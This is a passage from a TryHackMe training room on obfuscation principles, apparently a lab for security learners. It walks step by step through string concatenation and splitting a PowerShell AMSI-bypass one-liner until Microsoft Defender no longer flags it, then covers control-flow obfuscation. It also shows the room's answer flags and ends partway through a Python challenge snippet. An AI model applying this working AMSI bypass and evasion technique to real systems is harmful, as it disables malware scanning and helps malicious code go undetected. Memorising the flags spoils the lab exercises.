</code></pre><p>When a compiled binary is scanned with Yara, it will create a positive alert/detection if the defined string is present. Using concatenation, the string can be functionally the same but will appear as two independent strings when scanned, resulting in no alerts.</p><pre style="text-align:center" class=" language-powershell" tabindex="0"><code class=" language-powershell">IntPtr ASBPtr = GetProcAddress<span class="token punctuation">(</span>TargetDLL<span class="token punctuation">,</span> <span class="token string">"AmsiScanBuffer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p style="text-align:center"><img src="./TryHackMe _ Obfuscation Principles_files/c033d156dae21c3683c5034fe031a452.png" alt="down arrow" style="width:73.5px;height:73.5px"><br></p><pre style="text-align:center" class=" language-powershell" tabindex="0"><code class=" language-powershell">IntPtr ASBPtr = GetProcAddress<span class="token punctuation">(</span>TargetDLL<span class="token punctuation">,</span> <span class="token string">"Amsi"</span> <span class="token operator">+</span> <span class="token string">"Scan"</span> <span class="token operator">+</span> <span class="token string">"Buffer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>If the second code block were to be scanned with the Yara rule, there would be no alerts!</p><hr><p>


</p><p>Extending from concatenation, attackers can also use&nbsp;<strong>non-interpreted characters</strong> to disrupt or confuse a static signature. These can be used independently or with concatenation, depending on the strength/implementation of the signature. Below is a table of some common non-interpreted characters that we can leverage.</p><table class="table table-bordered"><tbody><tr><td><b>Character<br></b></td><td><b>Purpose<br></b></td><td><b>Example</b><br></td></tr><tr><td>Breaks<br></td><td>Break a single string into multiple sub strings and combine them<br></td><td><p><code>('co'+'ffe'+'e')</code><br></p></td></tr><tr><td>Reorders<br></td><td>Reorder a string’s components<br></td><td><p><code>('{1}{0}'-f'ffee','co')</code><br></p></td></tr><tr><td>Whitespace<br></td><td>Include white space that is not interpreted<br></td><td><p><code>.( 'Ne' +'w-Ob' + 'ject')</code><br></p></td></tr><tr><td>Ticks<br></td><td>Include ticks that are not interpreted<br></td><td><p><code>d`own`LoAd`Stri`ng</code><br></p></td></tr><tr><td>Random Case<br></td><td>Tokens are generally not case sensitive and can be any arbitrary case<br></td><td><p><code>dOwnLoAdsTRing</code><br></p></td></tr></tbody></table><hr><p><span>Using the knowledge you have accrued throughout this task, obfuscate the following <a class="hM9BCF9p glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;hM9BCF9p&#39;)">PowerShell</a> snippet until it evades Defender’s detections.</span></p><pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.AmsiUtils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">'amsiInitFailed'</span><span class="token punctuation">,</span><span class="token string">'NonPublic,Static'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token boolean">$true</span><span class="token punctuation">)</span>
</code></pre><p>To get you started, we recommend breaking up each section of the code and observe how it interacts or is detected. You can then break the signature present in the independent section and add another section to it until you have a clean snippet.</p><p>Once you think your snippet is sufficiently obfuscated, submit it to the webserver at <code>http://MACHINE_IP</code>&nbsp;; if successful a flag will appear in a pop-up.</p><p>




</p><p>If you are still stuck we have provided a walkthrough of the solution below.</p>
<div style="border-radius:15px;border:1px solid #020c54;background-color:rgba(191,191,191,0.8);width:80%;margin:0 auto;padding:15px;margin-bottom:20px"><details><summary><u><i>Solution Walkthrough (Click to read)</i></u></summary><span style="font-size:1rem"><br>To begin trying to clean this code snippet we need to break it down and understand where the alerts are originating.</span>
<p>We can break the snippet where each cmdlet is present (<code>GetField</code>, <code>SetValue</code>)</p>
<ol>
<li><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')</code></li>
<li><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')</code></li>
<li><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></li>
</ol>
<p><span>Let’s execute the first code snippet and see what <a class="GV3EMdy2 glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;GV3EMdy2&#39;)">PowerShell</a> returns.</span></p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token function">PS</span> M:\\&gt; <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.AmsiUtils'</span><span class="token punctuation">)</span>
At line:1 char:1
<span class="token operator">+</span> <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.AmsiUtils'</span><span class="token punctuation">)</span>
<span class="token operator">+</span> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software<span class="token punctuation">.</span>
    <span class="token operator">+</span> CategoryInfo          : ParserError: <span class="token punctuation">(</span>:<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ParentContainsErrorRecordException
    <span class="token operator">+</span> FullyQualifiedErrorId : ScriptContainedMaliciousContent
</code></pre>
<p>Nothing surprising there… we can break this snippet up further by breaking up the .NET assembly and seeing which part results in an alert.</p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token function">PS</span> M:\\&gt; <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System'</span><span class="token punctuation">)</span>
<span class="token function">PS</span> M:\\&gt; <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management'</span><span class="token punctuation">)</span>
<span class="token function">PS</span> M:\\&gt; <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation'</span><span class="token punctuation">)</span>
<span class="token function">PS</span> M:\\&gt; <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.AmsiUtils'</span><span class="token punctuation">)</span>
At line:1 char:1
<span class="token operator">+</span> <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.AmsiUtils'</span><span class="token punctuation">)</span>
<span class="token operator">+</span> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software<span class="token punctuation">.</span>
    <span class="token operator">+</span> CategoryInfo          : ParserError: <span class="token punctuation">(</span>:<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ParentContainsErrorRecordException
    <span class="token operator">+</span> FullyQualifiedErrorId : ScriptContainedMaliciousContent
</code></pre>
<p>We now know that <code>AmsiUtils</code> is contributing directly to the alert. Next, we can target it with concatenation to break it up and attempt to make this section clean.</p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token function">PS</span> M:\\&gt; <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.'</span><span class="token operator">+</span><span class="token string">'Amsi'</span><span class="token operator">+</span><span class="token string">'Utils'</span><span class="token punctuation">)</span>

IsPublic IsSerial Name                                     BaseType
<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span> <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span> <span class="token operator">--</span>-<span class="token operator">-</span>                                     <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>
False    False    AmsiUtils                                System<span class="token punctuation">.</span>Object
</code></pre>
<p>Success! Now we can append our next snippet to this clean version of the first snippet and execute it.</p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token function">PS</span> M:\\&gt; <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.'</span><span class="token operator">+</span><span class="token string">'Amsi'</span><span class="token operator">+</span><span class="token string">'Utils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">'amsiInitFailed'</span><span class="token punctuation">,</span><span class="token string">'NonPublic,Static'</span><span class="token punctuation">)</span>
At line:1 char:1
<span class="token operator">+</span> <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.'</span><span class="token operator">+</span><span class="token string">'Amsi'</span><span class="token operator">+</span><span class="token string">'Utils'</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">+</span> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software<span class="token punctuation">.</span>
    <span class="token operator">+</span> CategoryInfo          : ParserError: <span class="token punctuation">(</span>:<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ParentContainsErrorRecordException
    <span class="token operator">+</span> FullyQualifiedErrorId : ScriptContainedMaliciousContent
</code></pre>
<p><span>Now this snippet may be harder to track down…. With some prior knowledge of <a class="POHnbwHc glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;POHnbwHc&#39;)">PowerShell</a> we can assume that </span><code>NonPublic</code> and <code>Static</code> are both pretty standard and would not contribute to the signature. We can assume <code>amsiInitFailed</code> is what Defender is alerting on and attempt to split it.</p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token function">PS</span> M:\\&gt; <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.'</span><span class="token operator">+</span><span class="token string">'Amsi'</span><span class="token operator">+</span><span class="token string">'Utils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">'amsi'</span><span class="token operator">+</span><span class="token string">'Init'</span><span class="token operator">+</span><span class="token string">'Failed'</span><span class="token punctuation">,</span><span class="token string">'No'</span><span class="token operator">+</span><span class="token string">'nPublic,S'</span><span class="token operator">+</span><span class="token string">'tatic'</span><span class="token punctuation">)</span>

Name                   : amsiInitFailed
MetadataToken          : 67114384
<span class="token namespace">[snip]</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token namespace">[snip]</span>
IsSecurityTransparent  : False
CustomAttributes       : <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre>
<p>Success! Now we can append our next snippet to this clean version of the first and second snippet and execute it.</p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token function">PS</span> M:\\&gt; <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.'</span><span class="token operator">+</span><span class="token string">'Amsi'</span><span class="token operator">+</span><span class="token string">'Utils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">'amsi'</span><span class="token operator">+</span><span class="token string">'Init'</span><span class="token operator">+</span><span class="token string">'Failed'</span><span class="token punctuation">,</span><span class="token string">'No'</span><span class="token operator">+</span><span class="token string">'nPublic,S'</span><span class="token operator">+</span><span class="token string">'tatic'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token boolean">$true</span><span class="token punctuation">)</span>
At line:1 char:1
<span class="token operator">+</span> <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.'</span><span class="token operator">+</span><span class="token string">'Amsi'</span><span class="token operator">+</span><span class="token string">'Utils'</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">+</span> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software<span class="token punctuation">.</span>
    <span class="token operator">+</span> CategoryInfo          : ParserError: <span class="token punctuation">(</span>:<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ParentContainsErrorRecordException
    <span class="token operator">+</span> FullyQualifiedErrorId : ScriptContainedMaliciousContent

<span class="token function">PS</span> M:\\&gt;
</code></pre>
<p>This is interesting, there doesn’t seem to be any parameter values that would contribute to this alert? This must mean that Defender is alerting on the presence of each cmdlet together to determine it is a malicious snippet. To solve this problem we need to separate the cmdlet(s) from the rest of the snippet. This technique is known as separation of related code and is often seen along with concatenation, we will cover this concept further in task 8.</p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token function">PS</span> M:\\&gt; <span class="token variable">$Value</span>=<span class="token string">"SetValue"</span>
<span class="token function">PS</span> M:\\&gt; <span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.'</span><span class="token operator">+</span><span class="token string">'Amsi'</span><span class="token operator">+</span><span class="token string">'Utils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">'amsi'</span><span class="token operator">+</span><span class="token string">'Init'</span><span class="token operator">+</span><span class="token string">'Failed'</span><span class="token punctuation">,</span><span class="token string">'No'</span><span class="token operator">+</span><span class="token string">'nPublic,S'</span><span class="token operator">+</span><span class="token string">'tatic'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$Value</span><span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token boolean">$true</span><span class="token punctuation">)</span>
<span class="token function">PS</span> M:\\&gt;
</code></pre>
<p>Success! There are no more alerts so we now have a clean snippet that we can use! Submit this clean code snippet to <code>http://MACHINE_IP</code> and obtain the flag.</p></details></div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What flag is found after uploading a properly obfuscated snippet?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{**************************}" value="THM{koNC473n473_4Ll_7H3_7H1n95}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-5">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse5">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 5                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Obfuscation's Function for Analysis Deception
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse5" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>After obfuscating basic functions of malicious code, it may be able to pass software detections but is still susceptible to human analysis. While not a security boundary without further policies, analysts and reverse engineers can gain deep insight into the functionality of our malicious application and halt operations.</p><p>Adversaries can leverage advanced logic and mathematics to create more complex and harder-to-understand code to combat analysis and reverse engineering.</p><p>For more information about reverse engineering, check out the <a href="https://tryhackme.com/module/malware-analysis">Malware Analysis module</a>.</p><p>


</p><p>The aforementioned white paper: <a href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">Layered Obfuscation Taxonomy</a>, summarizes these practices well under other sub-layers of the <strong>code-element layer</strong>. Below is a table of methods covered by the taxonomy in the <strong>obfuscating layout</strong> and <strong>obfuscating controls sub-layers</strong>.</p><p style="text-align:center"><img src="./TryHackMe _ Obfuscation Principles_files/f9e4be87a9801b500d118e2c83e19c01.png" alt="Diagram showing the objectives of the Obfuscating Layer sub-layer: junk codes, separation of related codes, stripping redundant symbols, and meaningless identifiers"><br></p><table class="table table-bordered"><tbody><tr><td><b>Obfuscation Method<br></b></td><td><b>Purpose</b><br></td></tr><tr><td>Junk Code<br></td><td>Add junk instructions that are non-functional, also known as a code stubs<br></td></tr><tr><td>Separation of Related Code<br></td><td>Separate related codes or instructions to increase difficulty in reading the program<br></td></tr><tr><td>Stripping Redundant Symbols<br></td><td>Strips symbolic information such as debug information or other symbol tables<br></td></tr><tr><td>Meaningless Identifiers<br></td><td>Transform a meaningful identifier to something meaningless<br></td></tr><tr><td>Implicit Controls<br></td><td>Converts explicit controls instructions to implicit instructions<br></td></tr><tr><td>Dispatcher-based Controls<br></td><td>Determines the next block to be executed during the runtime<br></td></tr><tr><td>Probabilistic Control Flows<br></td><td>Introduces replications of control flows with the same semantics but different syntax<br></td></tr><tr><td>Bogus Control Flows<br></td><td>Control flows deliberately added to a program but will never be executed<br></td></tr></tbody></table><p>In the upcoming tasks, we will demonstrate several of the above methods in an agnostic format.</p><p>
</p><p>Check out the <a href="https://tryhackme.com/room/sandboxevasion">Sandbox Evasion room</a> for more information about anti-analysis and anti-reversing</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p><span style="font-size:1rem">What are junk instructions referred to as in junk code?</span></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: **** *****" value="Code Stubs" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What obfuscation layer aims to confuse an analyst by manipulating the code flow and abstract syntax trees?<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *********** ********" value="Obfuscating Controls" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-6">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse6">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 6                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Code Flow and Logic
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse6" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><strong>Control flow</strong> is a critical component of a program’s execution that will define how a program will logically proceed.&nbsp;<strong>Logic</strong> is one of the most significant determining factors to an application’s control flow and encompasses various uses such as&nbsp;<strong>if/else statements</strong> or&nbsp;<strong>for loops</strong>. A program will traditionally execute from the top-down; when a logic statement is encountered, it will continue execution by following the statement.</p><p>
</p><p>Below is a table of some logic statements you may encounter when dealing with control flows or program logic.</p><table class="table table-bordered"><tbody><tr><td><b>Logic Statement<br></b></td><td><b>Purpose</b><br></td></tr><tr><td>if/else<br></td><td>Executes only <span style="font-weight:600" class="notion-enable-hover">if</span> a condition is met, <span style="font-weight:600" class="notion-enable-hover">else</span> it will execute a different code block<br></td></tr><tr><td>try/catch<br></td><td>Will <span style="font-weight:600" class="notion-enable-hover">try</span> to execute a code block and <span style="font-weight:600" class="notion-enable-hover">catch</span> it if it fails to handle errors.<br></td></tr><tr><td>switch case<br></td><td>A <span style="font-weight:600" class="notion-enable-hover">switch</span> will follow similar conditional logic to an if statement but checks several different possible conditions with <span style="font-weight:600" class="notion-enable-hover">cases</span> before resolving to a <span style="font-weight:600" class="notion-enable-hover">break</span> or <span style="font-weight:600" class="notion-enable-hover">default</span><br></td></tr><tr><td>for/while loop<br></td><td>A <span style="font-weight:600" class="notion-enable-hover">for </span>loop will execute for a set amount of a condition. A <span style="font-weight:600" class="notion-enable-hover">while</span> loop will execute until a condition is no longer met.<br></td></tr></tbody></table><p></p><p>To make this concept concrete, we can observe an example function and its corresponding <strong>CFG</strong> (<strong>C</strong>ontrol <strong>F</strong>low <strong>G</strong>raph) to depict it’s possible control flow paths.</p><p>
</p><div>

<pre class=" language-python" tabindex="0"><code class=" language-python">x <span class="token operator">=</span> <span class="token number">10</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">&gt;</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"This executes"</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"This is ignored"</span><span class="token punctuation">)</span>
</code></pre><p style="text-align:center"><img src="./TryHackMe _ Obfuscation Principles_files/cfc2504b9a4a76682d724413080e3729.png" alt="Control flow diagram showing two different logical paths" style="width:326.5px;height:221.302px"><br></p><p>What does this mean for attackers? An analyst can attempt to understand a program’s function through its control flow; while problematic, logic and control flow is almost effortless to manipulate and make arbitrarily confusing. When dealing with control flow, an attacker aims to introduce enough obscure and arbitrary logic to confuse an analyst but not too much to raise further suspicion or potentially be detected by a platform as malicious.</p><p>
</p><p>In the upcoming task, we will discuss different control flow patterns an attacker can use to confuse an analyst.</p></div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Can logic change and impact the control flow of a program? (T/F)
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *" value="T" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-7">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse7">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 7                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Arbitrary Control Flow Patterns
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse7" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>To craft <strong>arbitrary control flow patterns</strong> we can leverage <strong>maths</strong>, <strong>logic</strong>, and/or other <strong>complex algorithms</strong> to inject a different control flow into a malicious function.</p><p>We can leverage&nbsp;<strong>predicates</strong> to craft these complex logic and/or mathematical algorithms. Predicates refer to the decision-making of an input function to return&nbsp;<strong>true</strong> or&nbsp;<strong>false</strong>. Breaking this concept down at a high level, we can think of a predicate similar to the condition an if statement uses to determine if a code block will be executed or not, as seen in the example in the previous task.</p><p>Applying this concept to obfuscation,&nbsp;<strong>opaque predicates</strong> are used to control a known output and input. The paper,&nbsp;<a href="https://etda.libraries.psu.edu/files/final_submissions/17513">Opaque Predicate: Attack and Defense in Obfuscated Binary Code</a>, states, “An opaque predicate is a predicate whose value is known to the obfuscator but is difficult to deduce. It can be seamlessly applied with other obfuscation methods such as junk code to turn reverse engineering attempts into arduous work.” Opaque predicates fall under the&nbsp;<strong>bogus control flow</strong> and&nbsp;<strong>probabilistic control flow</strong> methods of the taxonomy paper; they can be used to arbitrarily add logic to a program or refactor the control flow of a pre-existing function.</p><p>


</p><p>The topic of opaque predicates requires a deeper understanding of mathematics and computing principles, so we will not cover it in-depth, but we will observe one common example.</p>
<div> <img src="./TryHackMe _ Obfuscation Principles_files/c1a1b8196a13becaa1efec050260c81b.png" alt="Control flow diagram showing the various logical paths of the collatz conjecture" style="float:right;width:384px;height:530.928px" class="note-float-right"><p>The&nbsp;<strong>Collatz Conjecture</strong> is a common mathematical problem that can be used as an example of an opaque predicate. It states: If two arithmetic operations are repeated, they will return one from every positive integer. The fact that we know it will always output one for a known input (a positive integer) means it is a viable opaque predicate. For more information about the Collatz conjecture, refer to the&nbsp;<a href="https://mathworld.wolfram.com/CollatzProblem.html">Collatz Problem</a>. Below is an example of the Collatz conjecture applied in Python.</p><pre class=" language-python" tabindex="0"><code class=" language-python">x <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span><span class="token punctuation">(</span>x <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		x<span class="token operator">=</span>x<span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">1</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		x<span class="token operator">=</span>x<span class="token operator">/</span><span class="token number">2</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello!"</span><span class="token punctuation">)</span> </code></pre><p>In the above code snippet, the Collatz conjecture will only perform its mathematical operations if <code>x &gt; 1</code>, resulting in <code>1</code> or <code>TRUE</code>. From the definition of the Collatz problem, it will always return one for a positive integer input, so the statement will always return true if <code>x</code> is a positive integer greater than one.</p><p>
</p><p>To prove the efficacy of this opaque predicate, we can observe its&nbsp;<strong>CFG</strong> (<strong>C</strong>ontrol&nbsp;<strong>F</strong>low&nbsp;<strong>G</strong>raph) to the right. If this is what an interpreted function looks like, just imagine what a compiled function may look like to an analyst.</p><hr><p>Using the knowledge you have accrued throughout this task, put yourself into the shoes of an analyst and attempt to decode the original function and output of the code snippet below.</p><p>If you correctly follow the print statements, it will result in a flag you can submit.</p><p></p>
</div>

<div style="border-radius:15px;border:1px solid #020c54;background-color:rgba(191,191,191,0.8);width:80%;margin:0 auto;padding:15px;margin-bottom:20px"><details><summary><u><i>Challenge Code Snippet (Click to view)</i></u></summary><pre class=" language-python" tabindex="0"><code class=" language-python">x <span class="token operator">=</span> <span class="token number">3</span>
swVar <span class="token operator">=</span> <span class="token number">1</span>
a <span class="token operator">=</span> <span class="token number">112340857612345</span>
b <span class="token operator">=</span> <span class="token number">1122135047612359087</span>
i <span class="token operator">=</span> <span class="token number">0</span>
case_1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"T"</span><span class="token punctuation">,</span><span class="token string">"d"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"e"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"g"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">,</span><span class="token string">"p"</span><span class="token punctuation">,</span><span class="token string">"y"</span><span class="token punctuation">,</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">]</span>
case_2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"1a"</span><span class="token punctuation">,</span><span class="token string">"H"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">,</span><span class="token string">"4a"</span><span class="token punctuation">,</span><span class="token string">"5a"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"7a"</span><span class="token punctuation">,</span><span class="token string">"8a"</span><span class="token punctuation">,</span><span class="token string">"d"</span><span class="token punctuation">,</span><span class="token string">"10a"</span><span class="token punctuation">,</span><span class="token string">"11a"</span><span class="token punctuation">,</span><span class="token string">"12a"</span><span class="token punctuation">,</span><span class="token string">"!"</span><span class="token punctuation">,</span><span class="token string">"14a"</span><span class="token punctuation">]</span>
